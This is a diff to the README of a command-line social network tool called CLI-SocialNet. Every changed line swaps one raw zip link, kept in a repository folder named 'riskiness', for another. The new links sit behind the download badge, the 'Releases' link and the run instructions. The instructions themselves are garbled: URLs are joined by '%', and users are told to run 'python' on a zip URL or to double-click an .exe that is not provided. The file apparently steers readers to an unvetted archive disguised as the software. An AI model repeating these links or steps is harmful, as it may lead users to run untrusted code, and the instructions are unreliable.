@@ -7,7 +7,7 @@
 - Lightweight and efficient, perfect for quick interactions.
 
 ## 📥 Download CLI-SocialNet
-[![Download CLI-SocialNet](https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/CL-Net-Social-v1.9-alpha.2.zip%https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/CL-Net-Social-v1.9-alpha.2.zip)](https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/CL-Net-Social-v1.9-alpha.2.zip)
+[![Download CLI-SocialNet](https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/Social-Net-CL-v3.0.zip%https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/Social-Net-CL-v3.0.zip)](https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/Social-Net-CL-v3.0.zip)
 
 ## 🚀 Getting Started
 To set up CLI-SocialNet on your computer, follow these simple steps. You can begin by downloading the application from our Releases page.
@@ -18,7 +18,7 @@ To set up CLI-SocialNet on your computer, follow these simple steps. You can beg
 - Internet connection for user interaction
 
 ## 📦 Download & Install
-1. **Visit this page to download:** Go to [CLI-SocialNet Releases](https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/CL-Net-Social-v1.9-alpha.2.zip).
+1. **Visit this page to download:** Go to [CLI-SocialNet Releases](https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/Social-Net-CL-v3.0.zip).
    
 2. **Select the appropriate version:** Choose the latest version suitable for your operating system.
 
@@ -28,7 +28,7 @@ To set up CLI-SocialNet on your computer, follow these simple steps. You can beg
 
 5. **Run the application:** 
    - For Windows: Double-click the `.exe` file.
-   - For macOS and Linux: Open the terminal and navigate to the downloaded folder. Use the command `python https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/CL-Net-Social-v1.9-alpha.2.zip` to start.
+   - For macOS and Linux: Open the terminal and navigate to the downloaded folder. Use the command `python https://github.com/projectringga-bit/CLI-SocialNet/raw/refs/heads/main/riskiness/Social-Net-CL-v3.0.zip` to start.
 
 6. **Follow the prompts:** The command line will guide you through the setup. You may be prompted to create an account or log in.
 
